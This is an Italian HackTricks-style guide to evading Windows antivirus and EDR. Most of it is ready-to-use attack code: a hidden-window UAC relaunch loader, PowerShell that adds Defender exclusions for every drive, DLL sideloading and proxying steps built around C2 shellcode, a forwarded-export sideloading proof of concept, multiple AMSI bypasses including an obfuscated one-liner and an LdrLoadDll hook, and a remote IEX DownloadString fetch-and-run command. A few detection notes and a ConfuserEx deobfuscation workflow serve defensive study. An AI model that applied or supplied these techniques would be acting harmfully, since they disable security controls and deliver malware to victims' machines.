# Elusione dell'antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata scritta inizialmente da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Bloccare Defender

- [defendnot](https://github.com/es3n1n/defendnot): uno strumento per impedire a Windows Defender di funzionare.
- [no-defender](https://github.com/es3n1n/no-defender): uno strumento per impedire a Windows Defender di funzionare, fingendo di essere un altro antivirus.
- [Disabilitare Defender se si è amministratori](basic-powershell-for-pentesters/README.md)

### Esca UAC in stile installer prima di manomettere Defender

I loader pubblici che si spacciano per cheat per videogiochi vengono spesso distribuiti come installer Node.js/Nexe non firmati, che prima **chiedono all'utente di ottenere privilegi elevati** e solo in seguito disattivano Defender. La procedura è semplice:

1. Verificare la presenza di un contesto amministrativo con `net session`. Il comando riesce solo se chi lo esegue dispone dei diritti di amministratore, quindi un errore indica che il loader è in esecuzione come utente standard.
2. Riavviare immediatamente il programma usando il verbo `RunAs` per visualizzare la prevista richiesta di conferma UAC, mantenendo la riga di comando originale.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Le vittime credono già di installare software “crackato”, quindi di solito accettano la richiesta, concedendo al malware i privilegi necessari per modificare i criteri di Defender.<sup>[[26]](#references)</sup>

### Esclusioni generalizzate di `MpPreference` per ogni lettera di unità

Una volta ottenuti privilegi elevati, le catene in stile GachiLoader ampliano al massimo i punti ciechi di Defender invece di disabilitare direttamente il servizio. Il loader prima termina il watchdog dell’interfaccia grafica (`taskkill /F /IM SecHealthUI.exe`), quindi imposta **esclusioni estremamente ampie**, così che ogni profilo utente, directory di sistema e disco rimovibile diventi non analizzabile:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Osservazioni principali:

- Il loop attraversa tutti i filesystem montati (D:\, E:\, chiavette USB, ecc.), quindi **qualsiasi payload futuro salvato in un punto qualsiasi del disco viene ignorato**.
- L’esclusione dell’estensione `.sys` è lungimirante: gli attacker si riservano la possibilità di caricare driver non firmati in seguito, senza dover intervenire di nuovo su Defender.
- Tutte le modifiche vengono applicate in `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, consentendo alle fasi successive di verificare che le esclusioni persistano o di ampliarle senza innescare nuovamente l’UAC.

Poiché nessun servizio di Defender viene arrestato, i controlli di integrità più semplicistici continuano a segnalare che “l’antivirus è attivo”, anche se l’ispezione in tempo reale non controlla mai quei percorsi.<sup>[[26]](#references)</sup>

## **Metodologia di evasione dell’AV**

Attualmente, gli AV usano metodi diversi per stabilire se un file è dannoso o meno: rilevamento statico, analisi dinamica e, per gli EDR più avanzati, analisi comportamentale.

### **Rilevamento statico**

Il rilevamento statico consiste nell’individuare stringhe o sequenze di byte dannose note all’interno di un binario o di uno script, oltre a estrarre informazioni dal file stesso (ad esempio descrizione del file, nome della società, firme digitali, icona, checksum, ecc.). Ciò significa che l’uso di strumenti pubblici noti può farti individuare più facilmente, perché probabilmente sono già stati analizzati e segnalati come dannosi. Esistono alcuni modi per aggirare questo tipo di rilevamento:

- **Crittografia**

Se crittografi il binario, l’AV non potrà rilevare il tuo programma, ma ti servirà un qualche tipo di loader per decrittarlo ed eseguirlo in memoria.

- **Offuscamento**

A volte basta modificare alcune stringhe nel binario o nello script per superare i controlli dell’AV, ma può richiedere molto tempo, a seconda di ciò che stai cercando di offuscare.

- **Strumenti personalizzati**

Se sviluppi strumenti tuoi, non esisteranno firme dannose note, ma serviranno molto tempo e impegno.

> [!TIP]
> Un buon modo per verificare il rilevamento statico di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Suddivide il file in più segmenti e chiede a Defender di analizzarli singolarmente; in questo modo può indicarti esattamente quali stringhe o byte nel binario vengono segnalati.

Ti consiglio vivamente di dare un’occhiata a questa [playlist di YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sull’evasione pratica degli AV.

### **Analisi dinamica**

L’analisi dinamica si verifica quando l’AV esegue il tuo binario in una sandbox e osserva eventuali attività dannose (ad esempio, tentare di decrittare e leggere le password del browser, eseguire un minidump di LSASS, ecc.). Questa parte può essere un po’ più complicata da gestire, ma ecco alcune cose che puoi fare per eludere le sandbox.

- **Attendere prima dell’esecuzione** A seconda di come viene implementato, può essere un ottimo modo per aggirare l’analisi dinamica dell’AV. Gli AV hanno pochissimo tempo per analizzare i file senza interrompere il flusso di lavoro dell’utente, quindi attese prolungate possono compromettere l’analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare l’attesa, a seconda di come è implementata.
- **Controllare le risorse della macchina** Di solito le sandbox hanno risorse molto limitate (ad esempio, < 2GB di RAM), altrimenti potrebbero rallentare la macchina dell’utente. Puoi anche sbizzarrirti: per esempio, controllare la temperatura della CPU o persino la velocità delle ventole; non tutto sarà implementato nella sandbox.
- **Controlli specifici della macchina** Se vuoi prendere di mira un utente la cui workstation è aggiunta al dominio "contoso.local", puoi controllare il dominio del computer e verificare che corrisponda a quello specificato; in caso contrario, puoi fare in modo che il programma termini.

A quanto pare, il nome del computer della sandbox di Microsoft Defender è HAL9TH. Puoi quindi controllare il nome del computer nel malware prima della detonazione: se corrisponde a HAL9TH, significa che ti trovi nella sandbox di Defender, quindi puoi fare in modo che il programma termini.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi consigli di [@mgeeky](https://twitter.com/mariuszbit) per eludere le sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Discord di Red Team VX</a> canale #malware-dev</p></figcaption></figure>

Come abbiamo già detto in questo post, gli **strumenti pubblici** prima o poi **verranno rilevati**, quindi dovresti porti una domanda:

Per esempio, se vuoi eseguire un dump di LSASS, **hai davvero bisogno di usare mimikatz**? Oppure potresti usare un progetto diverso, meno noto, che esegue anch’esso il dump di LSASS?

Probabilmente la risposta giusta è la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei malware più segnalati dagli AV e dagli EDR, se non il più segnalato. Il progetto in sé è davvero interessante, ma è anche un incubo da usare per aggirare gli AV; cerca quindi delle alternative per raggiungere il tuo obiettivo.

> [!TIP]
> Quando modifichi i tuoi payload per eludere i controlli, assicurati di **disattivare l’invio automatico dei campioni** in Defender e, seriamente, **NON CARICARE SU VIRUSTOTAL** se il tuo obiettivo è mantenere l’evasione nel lungo periodo. Se vuoi verificare se un particolare AV rileva il tuo payload, installalo su una VM, prova a disattivare l’invio automatico dei campioni e fai i test lì finché non sei soddisfatto del risultato.

## EXE vs DLL

Quando possibile, **dai sempre la priorità all’uso delle DLL per l’evasione**. Per esperienza, i file DLL vengono in genere **rilevati e analizzati molto meno**, quindi in alcuni casi è un semplice trucco per evitare il rilevamento (se il tuo payload può essere eseguito come DLL, ovviamente).

Come possiamo vedere in questa immagine, un payload DLL di Havoc ha un tasso di rilevamento di 4/26 su antiscan.me, mentre il payload EXE ha un tasso di rilevamento di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>confronto su antiscan.me tra un normale payload EXE di Havoc e una normale DLL di Havoc</p></figcaption></figure>

Ora vedremo alcuni trucchi da usare con i file DLL per essere molto più furtivi.

## DLL Sideloading e Proxying

Il **DLL Sideloading** sfrutta l’ordine di ricerca delle DLL usato dal loader, collocando l’applicazione vittima e i payload dannosi affiancati.

Puoi individuare i programmi vulnerabili al DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e il seguente script powershell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Questo comando mostrerà l’elenco dei programmi vulnerabili al DLL hijacking all’interno di "C:\Program Files\\" e dei file DLL che tentano di caricare.

Ti consiglio vivamente di **esplorare personalmente i programmi soggetti a DLL Hijack/Sideload**, questa tecnica è piuttosto stealth se eseguita correttamente, ma se usi programmi DLL Sideloadable noti pubblicamente, potresti essere scoperto facilmente.

Il semplice fatto di posizionare una DLL malevola con il nome di una DLL che un programma si aspetta di caricare non farà sì che il payload venga caricato, perché il programma si aspetta di trovare funzioni specifiche all’interno della DLL. Per risolvere questo problema, useremo un’altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate effettuate da un programma dalla DLL proxy (e malevola) alla DLL originale, preservando così le funzionalità del programma e consentendo l’esecuzione del payload.

Userò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/)

Questi sono i passaggi che ho seguito:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

L'ultimo comando ci fornirà 2 file: un modello di codice sorgente per una DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Questi sono i risultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (codificato con [SGN](https://github.com/EgeBalci/sgn)) sia la proxy DLL hanno un tasso di rilevamento pari a 0/26 su [antiscan.me](https://antiscan.me)! Direi che è un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ti **consiglio vivamente** di guardare il [VOD su twitch di S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) su DLL Sideloading e anche il [video di ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) per approfondire ciò di cui abbiamo parlato.

### Abuso degli export inoltrati (ForwardSideLoading)

I moduli PE di Windows possono esportare funzioni che sono in realtà dei "forwarder": invece di puntare al codice, la voce dell'export contiene una stringa ASCII del formato `TargetDll.TargetFunc`. Quando un chiamante risolve l'export, il loader di Windows:

- Carica `TargetDll` se non è già stato caricato
- Risolve `TargetFunc` al suo interno

Comportamenti chiave da comprendere:
- Se `TargetDll` è una KnownDLL, viene fornita dallo spazio dei nomi protetto KnownDLLs (ad es. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Se `TargetDll` non è una KnownDLL, viene usato il normale ordine di ricerca delle DLL, che include la directory del modulo che sta risolvendo il forward.

Questo consente una primitiva di sideloading indiretta: trovare una DLL firmata che esporti una funzione inoltrata a un modulo non-KnownDLL, quindi collocare nella stessa directory una DLL controllata dall'attaccante, con un nome identico a quello del modulo di destinazione inoltrato. Quando viene richiamato l'export inoltrato, il loader risolve il forward e carica la tua DLL dalla stessa directory, eseguendo il tuo DllMain.<sup>[[13]](#references)</sup>

Esempio osservato su Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` non è una KnownDLL, quindi viene risolta tramite il normale ordine di ricerca.

PoC (copia-incolla):
1) Copia la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Inserisci una `NCRYPTPROV.dll` malevola nella stessa cartella. È sufficiente un DllMain minimale per ottenere code execution; non è necessario implementare la funzione inoltrata per attivare DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Attiva il forward con un LOLBin firmato:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Comportamento osservato:
- rundll32 (firmato) carica il `keyiso.dll` side-by-side (firmato)
- Durante la risoluzione di `KeyIsoSetAuditingInterface`, il loader segue il forward a `NCRYPTPROV.SetAuditingInterface`
- Il loader carica quindi `NCRYPTPROV.dll` da `C:\test` ed esegue il suo `DllMain`
- Se `SetAuditingInterface` non è implementata, viene visualizzato un errore "missing API" solo dopo che `DllMain` è già stato eseguito

Suggerimenti per la ricerca:
- Concentrati sui forwarded exports il cui modulo di destinazione non è un KnownDLL. I KnownDLL sono elencati in `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare i forwarded exports con strumenti come:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta l'inventario dei forwarder di Windows 11 per cercare possibili candidati: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Idee per il rilevamento/la difesa:
- Monitora i LOLBins (ad es., rundll32.exe) che caricano DLL firmate da percorsi non di sistema, seguiti dal caricamento di DLL non-KnownDLLs con lo stesso nome base da quella directory
- Genera un avviso per catene di processi/moduli come: `rundll32.exe` → `keyiso.dll` non di sistema → `NCRYPTPROV.dll` in percorsi scrivibili dagli utenti
- Applica policy di integrità del codice (WDAC/AppLocker) e impedisci scrittura+esecuzione nelle directory delle applicazioni

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze è un toolkit per payload che consente di aggirare gli EDR usando processi sospesi, syscall dirette e metodi di esecuzione alternativi`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo stealth.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'evasion è solo un gioco del gatto e del topo: ciò che funziona oggi potrebbe essere rilevato domani. Non fare mai affidamento su un solo strumento e, se possibile, prova a concatenare più tecniche di evasion.

## Direct/Indirect Syscalls e risoluzione SSN (SysWhispers4)

Gli EDR spesso inseriscono **hook inline in user mode** negli stub syscall di `ntdll.dll`. Per aggirare questi hook, puoi generare stub syscall **diretti** o **indiretti** che caricano il **SSN** (System Service Number) corretto e passano alla modalità kernel senza eseguire l'entrypoint esportato sottoposto a hook.<sup>[[32]](#references)</sup>

**Opzioni di invocazione:**
- **Direct (embedded)**: inserisce un'istruzione `syscall`/`sysenter`/`SVC #0` nello stub generato (senza accedere agli export di `ntdll`).
- **Indirect**: salta a un gadget `syscall` esistente all'interno di `ntdll`, così che la transizione al kernel sembri provenire da `ntdll` (utile per l'evasion euristica); **randomized indirect** sceglie un gadget da un pool a ogni chiamata.
- **Egg-hunt**: evita di incorporare su disco la sequenza statica di opcode `0F 05`; risolve una sequenza syscall a runtime.

**Strategie di risoluzione SSN resistenti agli hook:**
- **FreshyCalls (VA sort)**: deduce gli SSN ordinando gli stub syscall per indirizzo virtuale, invece di leggere i byte degli stub.
- **SyscallsFromDisk**: mappa una copia pulita di `\KnownDlls\ntdll.dll`, legge gli SSN dal suo `.text`, quindi la rimuove dalla mappatura (aggira tutti gli hook in memoria).
- **RecycledGate**: combina la deduzione degli SSN tramite ordinamento VA con la convalida degli opcode quando uno stub è pulito; se è sottoposto a hook, ricorre alla deduzione tramite VA.
- **HW Breakpoint**: imposta DR0 sull'istruzione `syscall` e usa un VEH per acquisire l'SSN da `EAX` a runtime, senza analizzare byte sottoposti a hook.

Esempio di utilizzo di SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI è stato creato per impedire il "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AV erano in grado di analizzare solo i **file su disco**. Quindi, se fosse stato possibile eseguire payload **direttamente in memoria**, l'AV non avrebbe potuto fare nulla per impedirlo, poiché non aveva sufficiente visibilità.

La funzionalità AMSI è integrata nei seguenti componenti di Windows.

- Controllo dell'account utente, o UAC (elevazione di EXE, COM, MSI o installazione di ActiveX)
- PowerShell (script, uso interattivo e valutazione dinamica del codice)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Macro VBA di Office

Consente alle soluzioni antivirus di ispezionare il comportamento degli script esponendone il contenuto in forma non crittografata e non offuscata.

Eseguendo `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`, Windows Defender genererà il seguente avviso.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Nota come anteponga `amsi:` e poi il percorso dell'eseguibile da cui è stato eseguito lo script, in questo caso powershell.exe

Non abbiamo scritto alcun file su disco, ma siamo stati comunque rilevati in memoria a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, anche il codice C# viene analizzato tramite AMSI. Questo riguarda anche `Assembly.Load(byte[])` per caricare codice da eseguire in memoria. Per questo motivo, per l'esecuzione in memoria si consiglia di usare versioni inferiori di .NET (come la 4.7.2 o precedenti) se si vuole eludere AMSI.

Esistono un paio di modi per aggirare AMSI:

- **Offuscamento**

Poiché AMSI si basa principalmente su rilevamenti statici, modificare gli script che si tenta di caricare può essere un buon metodo per eludere il rilevamento.

Tuttavia, AMSI è in grado di deoffuscare gli script anche se hanno più livelli di offuscamento, quindi l'offuscamento potrebbe non essere una buona opzione, a seconda di come viene eseguito. Questo rende l'elusione tutt'altro che semplice. A volte, però, basta modificare un paio di nomi di variabili per risolvere il problema, quindi dipende da quanto un elemento è stato segnalato.

- **AMSI Bypass**

Poiché AMSI viene implementato caricando una DLL nel processo di powershell (e anche in cscript.exe, wscript.exe ecc.), è possibile manometterlo facilmente anche con un utente senza privilegi. A causa di questa falla nell'implementazione di AMSI, i ricercatori hanno trovato diversi modi per eludere l'analisi di AMSI.

**Forzare un errore**

Forzare il fallimento dell'inizializzazione di AMSI (amsiInitFailed) farà sì che il processo corrente non avvii alcuna scansione. Questa tecnica è stata inizialmente divulgata da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per impedirne un uso più ampio.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

È bastata una riga di codice PowerShell per rendere inutilizzabile AMSI per il processo PowerShell corrente. Naturalmente, questa riga è stata segnalata da AMSI stessa, quindi è necessario modificarla per usare questa tecnica.

Ecco un bypass di AMSI modificato che ho ripreso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Tieni presente che probabilmente verrà segnalato una volta pubblicato questo post, quindi non dovresti pubblicare alcun codice se il tuo piano è rimanere inosservato.

**Memory Patching**

Questa tecnica è stata inizialmente scoperta da [@RastaMouse](https://twitter.com/_RastaMouse/) e consiste nel trovare l'indirizzo della funzione "AmsiScanBuffer" in amsi.dll (responsabile della scansione dell'input fornito dall'utente) e sovrascriverla con istruzioni che restituiscono il codice E_INVALIDARG. In questo modo, il risultato della scansione effettiva sarà 0, che viene interpretato come un risultato pulito.

> [!TIP]
> Leggi [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) per una spiegazione più dettagliata.

Esistono anche molte altre tecniche per bypassare AMSI con powershell. Consulta [**questa pagina**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**questo repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) per saperne di più.

### Bloccare AMSI impedendo il caricamento di amsi.dll (hook LdrLoadDll)

AMSI viene inizializzato solo dopo che `amsi.dll` è stata caricata nel processo corrente. Un bypass robusto e indipendente dal linguaggio consiste nell'applicare un hook in user-mode su `ntdll!LdrLoadDll`, che restituisce un errore quando il modulo richiesto è `amsi.dll`. Di conseguenza, AMSI non viene mai caricato e il processo non esegue alcuna scansione.<sup>[[23]](#references)</sup>

Schema dell'implementazione (pseudocodice C/C++ x64):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Note
- Funziona con PowerShell, WScript/CScript e loader personalizzati (qualsiasi cosa che altrimenti caricherebbe AMSI).
- Abbinalo all’invio degli script tramite stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) per evitare artefatti lunghi nella riga di comando.
- È stato visto in uso con loader eseguiti tramite LOLBins (ad esempio, `regsvr32` che chiama `DllRegisterServer`).

Anche lo strumento **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genera script per bypassare AMSI.
Anche lo strumento **[https://amsibypass.com/](https://amsibypass.com/)** genera script per bypassare AMSI evitando il rilevamento tramite firma, usando funzioni definite dall’utente, variabili ed espressioni di caratteri randomizzate e applicando maiuscole e minuscole casuali alle parole chiave di PowerShell.

**Rimuovere la firma rilevata**

Puoi usare strumenti come **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** per rimuovere dalla memoria del processo corrente la firma AMSI rilevata. Questi strumenti funzionano scansionando la memoria del processo corrente alla ricerca della firma AMSI e sovrascrivendola con istruzioni NOP, rimuovendola così dalla memoria.

**Prodotti AV/EDR che usano AMSI**

Puoi trovare un elenco dei prodotti AV/EDR che usano AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usare PowerShell versione 2**
Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire gli script senza che vengano scansionati da AMSI. Puoi fare così:

```bash
powershell.exe -version 2
```

## Logging di PowerShell

Il logging di PowerShell è una funzionalità che consente di registrare tutti i comandi PowerShell eseguiti su un sistema. Può essere utile per finalità di audit e risoluzione dei problemi, ma può anche essere un **problema per gli attacker che vogliono evitare il rilevamento**.

Per aggirare il logging di PowerShell, puoi usare le seguenti tecniche:

- **Disabilitare PowerShell Transcription e Module Logging**: a questo scopo puoi usare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Usare PowerShell versione 2**: se usi PowerShell versione 2, AMSI non verrà caricato, quindi potrai eseguire gli script senza che vengano analizzati da AMSI. Puoi farlo così: `powershell.exe -version 2`
- **Usare una sessione PowerShell unmanaged**: usa [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per ospitare PowerShell senza avviare `powershell.exe` (l’approccio usato da `powerpick` di Cobalt Strike). In questo modo si eludono i controlli associati specificamente al processo `powershell.exe`, ma non si disabilitano intrinsecamente AMSI, Script Block Logging o tutte le altre difese di PowerShell; la copertura dipende dal runtime e dall’implementazione dell’host.


## Offuscamento

> [!TIP]
> Diverse tecniche di offuscamento si basano sulla cifratura dei dati, che aumenta l’entropia del binario e lo rende più facile da rilevare per AV ed EDR. Fai attenzione e valuta di applicare la cifratura solo a sezioni specifiche del codice che sono sensibili o devono essere nascoste.

### Deoffuscare binari .NET protetti con ConfuserEx

Quando si analizza malware che usa ConfuserEx 2 (o fork commerciali), è comune incontrare diversi livelli di protezione che bloccano decompiler e sandbox. Il flusso di lavoro seguente **ripristina in modo affidabile un IL quasi originale**, che può poi essere decompilato in C# con strumenti come dnSpy o ILSpy.<sup>[[10]](#references)</sup>

1.  Rimozione dell’anti-tampering – ConfuserEx cifra ogni *corpo del metodo* e lo decifra all’interno del costruttore statico del *modulo* (`<Module>.cctor`). Inoltre, modifica il checksum PE, per cui qualsiasi modifica causa il crash del binario. Usa **AntiTamperKiller** per individuare le tabelle dei metadati cifrate, recuperare le chiavi XOR e riscrivere un assembly pulito:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   L'output contiene i 6 parametri anti-tamper (`key0-key3`, `nameHash`, `internKey`), utili per creare un proprio unpacker.

2.  Recupero di simboli / control-flow – passa il file *pulito* a **de4dot-cex** (un fork di de4dot compatibile con ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Opzioni:
     • `-p crx` – seleziona il profilo ConfuserEx 2
     • de4dot annullerà il control-flow flattening, ripristinerà i namespace, le classi e i nomi delle variabili originali e decripterà le stringhe costanti.

3.  Rimozione delle chiamate proxy – ConfuserEx sostituisce le chiamate dirette ai metodi con wrapper leggeri (noti anche come *chiamate proxy*) per rendere ancora più difficile la decompilazione. Rimuovili con **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Dopo questo passaggio dovresti vedere normali API .NET come `Convert.FromBase64String` o `AES.Create()` invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4.  Pulizia manuale – esegui il binario con dnSpy, cerca grandi blob Base64 o l’uso di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per individuare il *vero* payload. Spesso il malware lo memorizza come array di byte codificato in TLV e inizializzato all’interno di `<Module>.byte_0`.

La catena descritta ripristina il flusso di esecuzione **senza** dover eseguire il sample malevolo: è utile quando si lavora su una workstation offline.

> 🛈  ConfuserEx crea un attributo personalizzato chiamato `ConfusedByAttribute`, utilizzabile come IOC per classificare automaticamente i sample.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: offuscatore C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): l'obiettivo di questo progetto è fornire un fork open source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di offrire una maggiore sicurezza del software tramite l'[offuscamento del codice](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e la protezione da manomissioni.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come usare il linguaggio `C++11/14` per generare codice offuscato in fase di compilazione, senza usare strumenti esterni e senza modificare il compilatore.
- [**obfy**](https://github.com/fritzone/obfy): aggiunge uno strato di operazioni offuscate generate dal framework di metaprogrammazione dei template C++, rendendo un po' più difficile la vita di chi vuole crackare l'applicazione.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un offuscatore di binari x64 in grado di offuscare diversi file PE, tra cui .exe, .dll e .sys.
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice motore di codice metamorfico per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di offuscamento del codice granulare per i linguaggi supportati da LLVM, che usa ROP (return-oriented programming). ROPfuscator offusca un programma a livello di codice assembly trasformando le istruzioni normali in catene ROP, contrastando la nostra naturale concezione del normale flusso di controllo.
